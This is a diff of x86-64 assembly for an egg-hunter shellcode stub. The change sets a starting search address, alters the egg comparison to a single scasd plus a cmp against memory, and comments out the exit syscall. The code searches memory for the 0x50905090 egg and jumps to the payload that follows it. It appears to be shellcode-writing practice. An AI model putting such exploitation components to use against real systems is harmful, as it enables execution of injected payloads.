@@ -6,6 +6,7 @@ section .text
 	global _start
 _start:
 	xor edx, edx
+	mov edx, 0x00600000		; estimate of starting location of egg
 L0:
 	or dx, 0xfff			; prep 4096 PAGE_SIZE boundary - no nulls
 					; assumed that all addresses in PAGE are valid|invalid
@@ -25,14 +26,15 @@ L1:
 
 _egg:
 	mov eax, 0x50905090		; egg - NOP slide
-	mov edi, edx			; scas base
+	mov edi, edx			; scas base - pointer address 
 	scasd				; search for egg then inc 4 bytes
 	jnz L1				; if egg not found then inc addr one byte 
-	scasd 				; search for egg then inc 4 bytes
+	;scasd 				; search for egg then inc 4 bytes
+	cmp eax, [rdi]			; did we find the egg?
 	jnz L1				; if egg not found then inc addr one byte
 	jmp rdi				; egg found, 8 bytes are skipped, execute shellcode
 	
-_exit:					; exit not required since we intend to find egg 
-	xor eax, eax
-	add al, 1
-	syscall 
+;_exit:					; exit not required since we intend to find egg 
+;	xor eax, eax
+;	add al, 60
+;	syscall 
